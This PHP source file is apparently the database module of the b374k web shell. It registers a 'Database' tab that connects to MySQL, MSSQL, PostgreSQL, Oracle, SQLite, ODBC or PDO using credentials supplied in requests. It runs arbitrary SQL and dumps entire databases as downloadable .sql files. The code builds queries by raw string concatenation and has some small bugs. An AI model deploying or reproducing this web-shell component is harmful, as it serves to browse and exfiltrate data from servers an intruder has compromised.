<?php
if (!class_exists('DatabaseClass')) {
	class DatabaseClass {
		var $type;
		var $name;
		var $host;
		var $user;
		var $pass;
		var $port;
		var $countRows;
		var $conn = null;
		var $charset = 'utf8';
		var $errMsg = '';
		var $cache = array();

		function __construct($type = '', $host = '', $user = '', $pass = '', $countRows = false) {
			$this->type = $type;
			$this->host = $host;
			$this->user = $user;
			$this->pass = $pass;
			$this->countRows = $countRows;
		}

		function connect() {
			switch ($this->type) {
			case 'mysql':
				if (class_exists('mysqli')) {
					$this->conn = new mysqli($this->host, $this->user, $this->pass);
					mysqli_set_charset($this->conn, 'utf8');
				} elseif (function_exists('mysql_connect')) {
					$this->conn = @mysql_connect($this->host, $this->user, $this->pass);
					@mysql_set_charset('utf8');
				}
				break;
			case 'mssql':
				if (function_exists('sqlsrv_connect')) {
					$coninfo = array("UID" => $this->user, "PWD" => $this->pass);
					$this->conn = @sqlsrv_connect($this->host, $coninfo);
				} elseif (function_exists('mssql_connect')) {
					$this->conn = @mssql_connect($this->host, $this->user, $this->pass);
				}
				break;
			case 'pgsql':
				$hosts = explode(":", $this->host);
				if (count($hosts) == 2) {
					$host_str = "host=" . $hosts[0] . " port=" . $hosts[1];
				} else {
					$host_str = "host=" . $this->host;
				}
				if (function_exists('pg_connect')) {
					$this->conn = @pg_connect("$host_str user=$this->user password=$this->pass");
				}
				break;
			case 'oracle':
				if (function_exists('oci_connect')) {
					$this->conn = @oci_connect($this->user, $this->pass, $this->host);
				}
				break;
			case 'sqlite3':
				if (class_exists('SQLite3')) {
					if (!empty($this->host)) {
						try {
							$this->conn = new SQLite3($this->host);
						} catch (Exception $e) {
							$this->errMsg = $e->getMessage();
							return false;
						}
					}
				}
				break;
			case 'sqlite':
				if (function_exists('sqlite_open')) {
					$this->conn = @sqlite_open($this->host);
				}
				break;
			case 'odbc':
				if (function_exists('odbc_connect')) {
					$this->conn = @odbc_connect($this->host, $this->user, $this->pass);
				}
				break;
			case 'pdo':
				if (class_exists('PDO')) {
					if (!empty($this->host) && !empty($this->user) && !empty($this->pass)) {
						try {
							$this->conn = new PDO($this->host, $this->user, $this->pass);
						} catch (Exception $e) {
							$this->errMsg = $e->getMessage();
							return false;
						}
					}
				}
				break;
			default:
				break;
			}
			return $this->conn;
		}

		function query($query) {
			switch ($this->type) {
			case 'mysql':
				if (class_exists('mysqli')) {
					return $this->conn->query($query);
				} elseif (function_exists('mysql_query')) {
					return @mysql_query($query);
				}
				break;

			case 'mssql':
				if (function_exists('sqlsrv_query')) {
					return sqlsrv_query($this->conn, $query);
				} elseif (function_exists('mssql_query')) {
					return mssql_query($query);
				}
				break;

			case 'pgsql':
				return pg_query($query);
				break;
			case 'oracle':
				return oci_execute(oci_parse($this->conn, $query));
				break;
			case 'sqlite3':
				return $this->conn->query($query);
				break;
			case 'sqlite':
				return sqlite_query($this->conn, $query);
				break;
			case 'odbc':
				return odbc_exec($this->conn, $query);
				break;
			case 'pdo':
				return $this->conn->query($query);
				break;
			}
		}

		function num_rows($result) {
			switch ($this->type) {
			case 'mysql':
				if (class_exists('mysqli_result')) {
					return $result->mysqli_num_rows;
				} elseif (function_exists('mysql_num_rows')) {
					return mysql_num_rows($result);
				}
				break;

			case 'mssql':
				if (function_exists('sqlsrv_num_rows')) {
					return sqlsrv_num_rows($result);
				} elseif (function_exists('mssql_num_rows')) {
					return mssql_num_rows($result);
				}
				break;

			case 'pgsql':
				return pg_num_rows($result);
				break;
			case 'oracle':
				return oci_num_rows($result);
				break;
			case 'sqlite3':
				$metadata = $result->fetchArray();
				if (is_array($metadata)) {
					return $metadata['count'];
				}
				break;

			case 'sqlite':
				return sqlite_num_rows($result);
				break;
			case 'odbc':
				return odbc_num_rows($result);
				break;
			case 'pdo':
				return $result->rowCount();
				break;
			}
		}

		function num_fields($result) {
			switch ($this->type) {
			case 'mysql':
				if (class_exists('mysqli_result')) {
					return $result->field_count;
				} elseif (function_exists('mysql_num_fields')) {
					return mysql_num_fields($result);
				}
				break;

			case 'mssql':
				if (function_exists('sqlsrv_num_fields')) {
					return sqlsrv_num_fields($result);
				} elseif (function_exists('mssql_num_fields')) {
					return mssql_num_fields($result);
				}
				break;

			case 'pgsql':
				return pg_num_fields($result);
				break;
			case 'oracle':
				return oci_num_fields($result);
				break;
			case 'sqlite3':
				return $result->numColumns();
				break;
			case 'sqlite':
				return sqlite_num_fields($result);
				break;
			case 'odbc':
				return odbc_num_fields($result);
				break;
			case 'pdo':
				return $result->columnCount();
				break;
			}

		}

		function field_name($result, $i) {
			switch ($this->type) {
			case 'mysql':
				if (class_exists('mysqli_result')) {$z = $result->fetch_field();return $z->name;} elseif (function_exists('mysql_field_name')) {
					return mysql_field_name($result, $i);
				}
				break;

			case 'mssql':
				if (function_exists('sqlsrv_field_metadata')) {
					$metadata = sqlsrv_field_metadata($result);
					if (is_array($metadata)) {
						$metadata = $metadata[$i];
					}
					if (is_array($metadata)) {
						return $metadata['Name'];
					}

				} elseif (function_exists('mssql_field_name')) {
					return mssql_field_name($result, $i);
				}
				break;

			case 'pgsql':
				return pg_field_name($result, $i);
				break;
			case 'oracle':
				return oci_field_name($result, $i + 1);
				break;
			case 'sqlite3':
				return $result->columnName($i);
				break;
			case 'sqlite':
				return sqlite_field_name($result, $i);
				break;
			case 'odbc':
				return odbc_field_name($result, $i + 1);
				break;
			case 'pdo':
				$res = $result->getColumnMeta($i);
				return $res['name'];
				break;
			}
		}

		function fetch_data_row($result) {
			switch ($this->type) {
			case 'mysql':
				if (class_exists('mysqli_result')) {
					return $result->fetch_row();
				} elseif (function_exists('mysql_fetch_row')) {
					return mysql_fetch_row($result);
				}
				break;
			case 'mssql':
				if (function_exists('sqlsrv_fetch_array')) {
					return sqlsrv_fetch_array($result, 1);
				} elseif (function_exists('mssql_fetch_row')) {
					return mssql_fetch_row($result);
				}
				break;
			case 'pgsql':
				return pg_fetch_row($result);
				break;
			case 'oracle':
				return oci_fetch_row($result);
				break;
			case 'sqlite3':
				return $result->fetchArray(1);
				break;
			case 'sqlite':
				return sqlite_fetch_array($result, 1);
				break;
			case 'odbc':
				return odbc_fetch_array($result);
				break;
			case 'pdo':
				return $result->fetch(2);
				break;
			}

		}

		function fetch_data_assoc($result) {
			switch ($this->type) {
			case 'mysql':
				if (class_exists('mysqli_result')) {
					return $result->fetch_assoc();
				} elseif (function_exists('mysql_fetch_assoc')) {
					return mysql_fetch_assoc($result);
				}
				break;
			case 'mssql':
				if (function_exists('sqlsrv_fetch_array')) {
					return sqlsrv_fetch_array($result, 1);
				} elseif (function_exists('mssql_fetch_assoc')) {
					return mssql_fetch_assoc($result);
				}
				break;
			case 'pgsql':
				return pg_fetch_assoc($result);
				break;
			case 'oracle':
				return oci_fetch_assoc($result);
				break;
			case 'sqlite3':
				return $result->fetchArray(1);
				break;
			case 'sqlite':
				return sqlite_fetch_array($result, 1);
				break;
			case 'odbc':
				return odbc_fetch_array($result);
				break;
			case 'pdo':
				return $result->fetch(2);
				break;
			}

		}

		function close() {
			if (!$this->conn) {
				return;
			}
			switch ($this->type) {
			case 'mysql':
				if (class_exists('mysqli')) {
					return $this->conn->close();
				} elseif (function_exists('mysql_close')) {
					return mysql_close($this->conn);
				}
				break;

			case 'mssql':
				if (function_exists('sqlsrv_close')) {
					return sqlsrv_close($this->conn);
				} elseif (function_exists('mssql_close')) {
					return mssql_close($this->conn);
				}
				break;

			case 'pgsql':
				return pg_close($this->conn);
				break;
			case 'oracle':
				return oci_close($this->conn);
				break;
			case 'sqlite3':
				return $this->conn->close();
				break;
			case 'sqlite':
				return sqlite_close($this->conn);
				break;
			case 'odbc':
				return odbc_close($this->conn);
				break;
			case 'pdo':
				return $this->conn = null;
				break;
			}

		}

		function get_db_list() {
			if (isset($cache['db_list']) && sizeof($cache['db_list']) > 0) {
				return $cache['db_list'];
			} else {
				$showdb = '';
				switch ($this->type) {
				case 'mysql':
					$showdb = "SHOW DATABASES";
					break;
				case 'mssql':
					$showdb = "SELECT name FROM master..sysdatabases";
					break;
				case 'pgsql':
					$showdb = "SELECT schema_name FROM information_schema.schemata";
					break;
				case 'oracle':
					$showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME";
					break;
				case 'sqlite3':
				case 'sqlite':
					$showdb = "SELECT \"" . $this->host . "\"";
					break;
				default:
					$showdb = "SHOW DATABASES";
					break;
				}
				$dbs = $this->query($showdb);
				$db_list = array();
				if ($dbs != false) {
					while ($db_arr = $this->fetch_data_row($dbs)) {
						foreach ($db_arr as $db) {
							array_push($db_list, $db);
						}
					}
				}
				$cache['db_list'] = $db_list;
				return $db_list;
			}
		}

		function get_table_list($db) {
			$showtbl = '';
			switch ($this->type) {
			case 'mysql':
				$showtbl = "SHOW TABLES FROM " . $db;
				break;
			case 'mssql':
				$showtbl = "SELECT name FROM " . $db . "..sysobjects WHERE xtype = 'U'";
				break;
			case 'pgsql':
				$showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='" . $db . "'";
				break;
			case 'oracle':
				$showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='" . $db . "'";
				break;
			case 'sqlite3':
			case 'sqlite':
				$showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
				break;
			default:
				$showtbl = "";
				break;
			}

			$tbls = $this->query($showtbl);
			$tbl_list = array();
			if ($tbls != false) {
				while ($tbl_arr = $this->fetch_data_row($tbls)) {
					foreach ($tbl_arr as $tbl) {
						array_push($tbl_list, $tbl);
					}
				}
			}

			return $tbl_list;
		}

		function get_table_rows($db, $tbl) {
			if ($db == '' || $tbl == '') {
				return '0';
			}
			$counttbl = '';
			switch ($this->type) {
			case 'mysql':
			case 'mssql':
			case 'pgsql':
			case 'oracle':
			case 'sqlite3':
			case 'sqlite':
				$counttbl = "SELECT COUNT(*) FROM " . $db . '.' . $tbl;
				break;
			default:
				$counttbl = "";
				break;
			}

			$res_query = $this->query($counttbl);
			$res = array();

			while ($row = $this->fetch_data_row($res_query)) {
				foreach ($row as $item) {
					array_push($res, $item);
				}
			}
			if (sizeof($res) <= 0) {
				return 0;
			}
			return $res[0];
		}

		function showitems($db, $table, $start = 0, $limit = 10) {
			$showitems = '';
			switch ($this->type) {
			case 'mysql':
				$showitems = "SELECT * FROM " . $db . "." . $table . " LIMIT " . $start . "," . $limit . ";";
				break;
			case 'mssql':
				$showitems = "SELECT TOP " . $limit . " * FROM " . $db . ".." . $table . ";";
				break;
			case 'pgsql':
				$showitems = "SELECT * FROM " . $db . "." . $table . " LIMIT " . $limit . " OFFSET " . $start . ";";
				break;
			case 'oracle':
				$limit = $start + $limit;
				$showitems = "SELECT * FROM " . $db . "." . $table . " WHERE ROWNUM BETWEEN " . $start . " AND " . $limit . ";";
				break;
			case 'sqlite' || $type == 'sqlite3':
				$showitems = "SELECT * FROM " . $table . " LIMIT " . $start . "," . $limit . ";";
				break;
			default:
				$showitems = "";
				break;
			}
			return $showitems;
		}

		function dump_table($db, $table, $fp = false) {
			switch ($this->type) {
			case 'mysql':
				$res = $this->query('SHOW CREATE TABLE `' . $db . '`.`' . $table . '`');
				if ($res == false) {
					return;
				}
				$create_sql = $this->fetch_data_row($res);
				$sql = $create_sql[1] . ";\n";
				if ($fp) {
					fwrite($fp, $sql);
				} else {
					echo ($sql);
				}

				$res = $this->query('SELECT * FROM `' . $db . '`.`' . $table . '`');
				$i = 0;
				$head = true;
				while ($row = $this->fetch_data_assoc($res)) {
					$sql = '';
					if ($i % 1000 == 0) {
						$head = true;
						$sql = ";\n\n";
					}
					$columns = array();
					foreach ($row as $k => $v) {
						if ($v === null) {
							$row[$k] = "NULL";
						} elseif (is_int($v)) {
							$row[$k] = $v;
						} else {
							$row[$k] = "'" . @mysql_real_escape_string($v) . "'";
						}

						$columns[] = "`" . $k . "`";
					}
					if ($head) {
						$sql .= 'INSERT INTO `' . $table . '` (' . implode(", ", $columns) . ") VALUES \n\t(" . implode(", ", $row) . ')';
						$head = false;
					} else {
						$sql .= "\n\t,(" . implode(", ", $row) . ')';
					}

					if ($fp) {
						fwrite($fp, $sql);
					} else {
						echo ($sql);
					}

					$i++;
				}
				if (!$head) {
					if ($fp) {
						fwrite($fp, ";\n\n");
					} else {
						echo (";\n\n");
					}
				}

				break;
			case 'pgsql':
				$this->query('SELECT * FROM ' . $table);
				while ($row = $this->fetch_data_assoc()) {
					$columns = array();
					foreach ($row as $k => $v) {
						$row[$k] = "'" . addslashes($v) . "'";
						$columns[] = $k;
					}
					$sql = 'INSERT INTO ' . $table . ' (' . implode(", ", $columns) . ') VALUES (' . implode(", ", $row) . ');' . "\n";
					if ($fp) {
						fwrite($fp, $sql);
					} else {
						echo ($sql);
					}

				}
				break;
			}
			return false;
		}

		function dump_db($db, $fp = false) {
			$tbl_list = $this->get_table_list($db);
			foreach ($tbl_list as $tbl) {
				$this->dump_table($db, $tbl, $fp);
			}
		}

		public static function get_supported() {
			$db_supported = array();

			if (function_exists("mysql_connect")) {
				$db_supported[] = 'mysql';
			}

			if (function_exists("mssql_connect") || function_exists("sqlsrv_connect")) {
				$db_supported[] = 'mssql';
			}

			if (function_exists("pg_connect")) {
				$db_supported[] = 'pgsql';
			}

			if (function_exists("oci_connect")) {
				$db_supported[] = 'oracle';
			}

			if (function_exists("sqlite_open")) {
				$db_supported[] = 'sqlite';
			}

			if (class_exists("SQLite3")) {
				$db_supported[] = 'sqlite3';
			}

			if (function_exists("odbc_connect")) {
				$db_supported[] = 'odbc';
			}

			if (class_exists("PDO")) {
				$db_supported[] = 'pdo';
			}

			return implode(",", $db_supported);
		}

		function render_sider($db = '') {
			$res = '';
			if (($this->type != 'pdo') && ($this->type != 'odbc')) {
				$db_list = $this->get_db_list();

				if (sizeof($db_list) > 0) {
					foreach ($db_list as $db) {
						$res .= "<p class='boxtitle boxNav'>" . $db . "</p><table class='border tbl-list'>";
						$tbl_list = $this->get_table_list($db);
						if (sizeof($tbl_list) > 0) {
							foreach ($tbl_list as $tbl) {
								$res .= "<tr><td class='dbTable borderbottom' style='cursor:pointer;'>" . $tbl . '</td>';
								if ($this->countRows) {
									$res .= '<td>(' . $this->get_table_rows($db, $tbl) . ')</td>';
								}
								$res .= "</tr>";
							}
						}
						$res .= "</table>";
					}
				}
			}
			return $res;
		}

		function render_dump_dbs() {
			$db_list = $this->get_db_list();
			$res = '';
			foreach ($db_list as $tbl) {
				$res .= "<input type='checkbox' id='select_dbs' value='" . $tbl . "' style='width: 20px; margin-top: 2px; vertical-align: top;'><label>" . $tbl . "</label>";
			}
			return $res;
		}

		function render_content() {

		}
	}
}

$GLOBALS['module']['database']['id'] = "database";
$GLOBALS['module']['database']['title'] = "Database";
$GLOBALS['module']['database']['js_ontabselected'] = "";
$GLOBALS['module']['database']['content'] = "
<table class='boxtbl box-database'>
<thead>
	<tr>
		<th style='width:144px;'>Type</th>
		<th class='dbHostRow'>Host</th>
		<th class='dbUserRow'>Username</th>
		<th class='dbPassRow'>Password</th>
		<th class='dbPortRow'>Port</th>
		<th><input type='checkbox' id='dbCountRows' style='width: 20px; margin-top: 2px; vertical-align: top;'><label>Count Rows</label></th>
	</tr>
</thead>
<tbody>
	<tr class='dbHostInfoRow'>
		<td><select id='dbType'></select></td>
		<td class='dbHostRow'><input type='text' id='dbHost' value='localhost' onkeydown='trap_enter(event, 'db_connect');'></td>
		<td class='dbUserRow'><input type='text' id='dbUser' value='root' onkeydown='trap_enter(event, 'db_connect');'></td>
		<td class='dbPassRow'><input type='text' id='dbPass' value='123456' onkeydown='trap_enter(event, 'db_connect');'></td>
		<td class='dbPortRow'><input type='text' id='dbPort' value='' onkeydown='trap_enter(event, 'db_connect');'></td>
		<td style='width:100px;'><span class='button' onclick='db_connect();'>Connect</span></td>
	</tr>
	<tr class='dbConnectRow'>
		<td colspan='6' class='dbError' style='color: #FF0000;'></td>
	</tr>
</tbody>
</table>
<table class='boxtbl box-query'>
<tbody>
	<tr class='dbQueryRow' style='display:none;'>
		<td colspan='6'><textarea id='dbQuery' style='min-height:140px;height:140px;'>You can also press ctrl+enter to submit</textarea></td>
	</tr>
	<tr class='dbQueryRow' style='display:none;'>
		<td style='width:120px;'><span class='button' onclick=\"db_run();\">run</span></td>
		<td style='width:120px;'><span class='button' onclick=\"db_disconnect();\">disconnect</span></td>
		<td>Separate multiple commands with a semicolon <span class='strong'>(</span> ; <span class='strong'>)</span></td>
	</tr>
</tbody>
</table>
<div id='dbExport' class='dbBottom' style='display:none;'>
<table class='border' style='padding:0;'>
<td class='colFit borderright' style='vertical-align:top;'>Dump Tables:<br />
(<a href='javascript:;' onclick='db_dump_select_batch(true)'>Select All</a>)<br />
(<a href='javascript:;' onclick='db_dump_select_batch(false)'>Unselect All</a>)<br />
(<a href='javascript:;' onclick='db_dump_do()'>Do Export</a>)<br />
</td>
<td id='dbExportList' style='vertical-align:top;'></td>
</table>
</div>
<div id='dbBottom' class='dbBottom' style='display:none;'>
<br>
<table class='border' style='padding:0;'><tr><td id='dbNav' class='colFit borderright' style='vertical-align:top;'></td><td id='dbResult' style='vertical-align:top;'></td></tr></table>
</div>
";

if (isset($p['dbGetSupported'])) {
	$res = DatabaseClass::get_supported();
	if (empty($res)) {
		$res = "error: can't get supported database.";
	}

	output($res);
} elseif (isset($p['dbType']) && isset($p['dbHost']) && isset($p['dbUser']) && isset($p['dbPass']) && isset($p['dbPort'])) {
	$dbc = New DatabaseClass($p['dbType'], $p['dbHost'], $p['dbUser'], $p['dbPass']);
	$dbc->countRows = isset($p['dbCountRows']) && ($p['dbCountRows'] == 'true') ? true : false;
	$res = "";

	if ($dbc->connect() != false) {
		if (isset($p['dbQuery'])) {
			$query = $p['dbQuery'];
			$pagination = "";
			if ((isset($p['dbDB'])) && (isset($p['dbTable']))) {
				$db = trim($p['dbDB']);
				$table = trim($p['dbTable']);
				$start = (int) (isset($p['dbStart'])) ? trim($p['dbStart']) : 0;
				$limit = (int) (isset($p['dbLimit'])) ? trim($p['dbLimit']) : 100;

				$query = $dbc->showitems($db, $table, $start, $limit);

				$pagination = "Limit <input type='text' id='dbLimit' value='" . html_safe($limit) . "' style='width:50px;'>
								<span class='button' onclick=\"db_pagination('prev');\">prev</span>
								<span class='button' onclick=\"db_pagination('next');\">next</span>
								<input type='hidden' id='dbDB' value='" . html_safe($db) . "'>
								<input type='hidden' id='dbTable' value='" . html_safe($table) . "'>
								<input type='hidden' id='dbStart' value='" . html_safe($start) . "'>
								";
			}

			$querys = explode(";", $query);
			foreach ($querys as $query) {
				if (trim($query) != "") {
					$query_query = $dbc->query($query);
					if ($query_query != false) {
						$res .= "<p>" . html_safe($query) . ";&nbsp;&nbsp;&nbsp;<span class='strong'>[</span> ok <span class='strong'>]</span></p>";
						if (!empty($pagination)) {
							$res .= "<p>" . $pagination . "</p>";
						}
						if (!is_bool($query_query)) {
							$res .= "<table class='border dataView sortable tblResult'><tr>";
							for ($i = 0; $i < $dbc->num_fields($query_query); $i++) {
								$res .= "<th>" . html_safe($dbc->field_name($query_query, $i)) . "</th>";
							}

							$res .= "</tr>";
							while ($rows = $dbc->fetch_data_row($query_query)) {
								$res .= "<tr>";
								foreach ($rows as $r) {
									if ($r == null) {
										$res .= '<td><i>null</i></td>';
									} else {
										$res .= "<td>" . html_safe($r) . "</td>";
									}

								}
								$res .= "</tr>";
							}
							$res .= "</table>";
						}
					} else {
						$res .= "<p>" . html_safe($query) . ";&nbsp;&nbsp;&nbsp;<span class='strong'>[</span> error <span class='strong'>]</span></p>";
					}
				}
			}
		} elseif (isset($p['dbDump'])) {
			header("Content-Type: application/octet-stream");
			header('Content-Transfer-Encoding: binary');
			// header("Content-length: ".filesize($file));
			// header("Content-length: "."1024");
			header("Cache-Control: no-cache");
			header("Pragma: no-cache");
			// header("Content-disposition: attachment; filename=\"".basename($file)."\";");
			header("Content-disposition: attachment; filename=\"backup_".time().".sql\";");
			// $handler = fopen($file,"rb");
			// while(!feof($handler)){
			// 	print(fread($handler, 1024*8));
			// 	@ob_flush();
			// 	@flush();
			// }
			// fclose($handler);
			// die();

			$dbs = explode(',', $p['dbDump']);
			if (sizeof($dbs) > 0) {
				$dbc->dump_db($dbs[0]);
			}
			die();
		} else {
			$res .= $dbc->render_dump_dbs();
			$res .= '{[|b374k|]}';
			$res .= $dbc->render_sider();
		}
	}

	$dbc->close();

	if (!empty($res)) {
		output($res, 'utf-8');
	}

	output('error' . ($dbc->errMsg ? ' with ' . $dbc->errMsg : ''), 'utf-8');
}

?>